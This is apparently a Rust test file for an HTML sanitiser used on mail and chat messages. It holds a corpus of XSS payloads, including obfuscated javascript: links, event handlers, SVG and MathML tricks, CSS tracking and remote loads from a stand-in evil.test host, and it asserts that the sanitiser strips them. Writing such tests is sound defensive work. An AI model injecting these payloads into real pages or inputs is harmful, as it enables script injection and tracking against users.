//! Hostile mail and chat HTML is sanitised: an XSS corpus checked against independent invariants.

pub mod common;

use common::{CHAT_TAGS, MAIL_TAGS, check_safe};
use quorum_sanitize::{MailOptions, sanitize_chat, sanitize_mail};

const XSS_CORPUS: &[&str] = &[
    "<script>alert(1)</script>",
    "<SCRIPT SRC=https://evil.test/x.js></SCRIPT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1)>",
    "<img src=\"https://evil.test/a.png\" onload=\"alert(1)\">",
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
    "<IMG SRC=\"jav\tascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<a href=\"  JaVaScRiPt:alert(1)\">click</a>",
    "<a href=\"java&#x0D;script:alert(1)\">click</a>",
    "<a href=\"&#x6a;avascript&colon;alert(1)\">click</a>",
    "<a href=\"vbscript:msgbox(1)\">click</a>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>",
    "<a href=\"data:text/html,<script>alert(1)</script>\">click</a>",
    "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">",
    "<img src=\"data:text/html,<script>alert(1)</script>\">",
    "<iframe src=\"https://evil.test\"></iframe>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<object data=\"https://evil.test/x.swf\"></object>",
    "<embed src=\"https://evil.test/x.swf\">",
    "<applet code=x></applet>",
    "<form action=\"https://evil.test\"><input name=p><button formaction=\"javascript:alert(1)\">go</button></form>",
    "<base href=\"https://evil.test/\"><a href=\"/x\">rel</a>",
    "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.test\">",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=javascript:alert(1)\">",
    "<link rel=stylesheet href=\"https://evil.test/x.css\">",
    "<style>body{background:url(https://evil.test/track)}</style><p>x</p>",
    "<svg onload=alert(1)><script>alert(2)</script></svg>",
    "<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>",
    "<svg><animate attributeName=href values=javascript:alert(1) /></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
    "<math href=\"javascript:alert(1)\">x</math>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
    "<div style=\"width: expression(alert(1))\">x</div>",
    "<div style=\"background:url(javascript:alert(1))\">x</div>",
    "<div style=\"background-image: url('https://evil.test/track.gif')\">x</div>",
    "<div style=\"background:u\\72l(https://evil.test/x)\">x</div>",
    "<div style=\"background:url(https://evil.test/x)/**/\">x</div>",
    "<div style=\"behavior: url(x.htc); -moz-binding: url(x.xml#xss)\">x</div>",
    "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999\">overlay</div>",
    "<p style=\"color:red;background:image-set('https://evil.test/a.png' 1x)\">x</p>",
    "<table background=\"https://evil.test/bg.png\"><tr><td background=\"javascript:alert(1)\">x</td></tr></table>",
    "<body onload=alert(1)>x</body>",
    "<details open ontoggle=alert(1)>x</details>",
    "<video><source onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>x</marquee>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<input type=image src=x onerror=alert(1)>",
    "<a href=\"https://ok.test\" target=_blank ping=\"https://evil.test\" id=x class=y>ok</a>",
    "<img srcset=\"https://evil.test/a.png 1x\" src=\"cid:unknown\">",
    "<p id=\"__proto__\" name=\"x\">x</p>",
    "<template><script>alert(1)</script></template>",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<!-- <script>alert(1)</script> -->",
    "<?xml version=\"1.0\"?><script>alert(1)</script>",
    "<a href=\"quorum-link:javascript%3Aalert(1)\">fake</a><img src=\"quorum-remote:https%3A%2F%2Fevil.test\">",
    "<img src=\"quorum-cid:anything\"><div style=\"background:url(quorum-remote:x)\">x</div>",
    "<a href=\"https://ok.test/&quot;onmouseover=&quot;alert(1)\">x</a>",
    "<img alt=\"&quot; onerror=alert(1) x=&quot;\" src=\"https://evil.test/a.png\">",
    "<xmp><script>alert(1)</script></xmp>",
    "<plaintext><script>alert(1)</script>",
    "<textarea><script>alert(1)</script></textarea>",
    "<select><option><script>alert(1)</script></option></select>",
    "<at id=\"1\" onclick=alert(1)>mention</at>",
    "<at id=\"javascript:alert(1)\">bad id</at>",
    "<frameset><frame src=\"javascript:alert(1)\"></frameset>",
    "<keygen autofocus onfocus=alert(1)>",
    "<a href=\"\u{0}javascript:alert(1)\">nul</a>",
    "<a href=\"https://ok.test\" style=\"color:red\" onmouseover=\"alert(1)\">x</a>",
];

#[test]
fn hostile_mail_html_is_sanitised() {
    for payload in XSS_CORPUS {
        for allow in [false, true] {
            let opts = MailOptions::default().with_remote_images(allow).with_cid("logo@x", "att1");
            let out = sanitize_mail(payload, &opts);
            if let Err(e) = check_safe(&out.html, MAIL_TAGS) {
                panic!("payload {payload:?} (remote={allow}): {e}");
            }
            let lower = out.html.to_ascii_lowercase();
            assert!(!lower.contains("<script"), "{payload:?} -> {}", out.html);
        }
    }
}

#[test]
fn hostile_chat_html_is_sanitised() {
    for payload in XSS_CORPUS {
        let out = sanitize_chat(payload);
        if let Err(e) = check_safe(&out.html, CHAT_TAGS) {
            panic!("payload {payload:?}: {e}");
        }
        assert!(!out.html.contains("style="), "{payload:?} -> {}", out.html);
    }
}

#[test]
fn script_content_is_removed_not_escaped() {
    let out = sanitize_mail("<p>a</p><script>steal()</script><style>p{}</style>", &MailOptions::default());
    assert_eq!(out.html, "<p>a</p>");
}

#[test]
fn positioning_styles_are_dropped() {
    let out = sanitize_mail("<div style=\"position:fixed;z-index:9999;color:red\">x</div>", &MailOptions::default());
    assert_eq!(out.html, "<div style=\"color:red\">x</div>");
}

#[test]
fn meta_refresh_and_base_are_removed() {
    let out = sanitize_mail(
        "<meta http-equiv=refresh content=\"0;url=https://evil.test\"><base href=https://evil.test/><p>x</p>",
        &MailOptions::default(),
    );
    assert_eq!(out.html, "<p>x</p>");
}

#[test]
fn obfuscated_javascript_links_lose_href() {
    for payload in [
        "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
        "<a href=\"&#106;avascript:alert(1)\">x</a>",
        "<a href=\" javascript:alert(1)\">x</a>",
    ] {
        let out = sanitize_mail(payload, &MailOptions::default());
        assert_eq!(out.html, "<a rel=\"noopener noreferrer\">x</a>", "{payload}");
        assert!(out.blocked_count >= 1 || !out.html.contains("href"));
    }
}
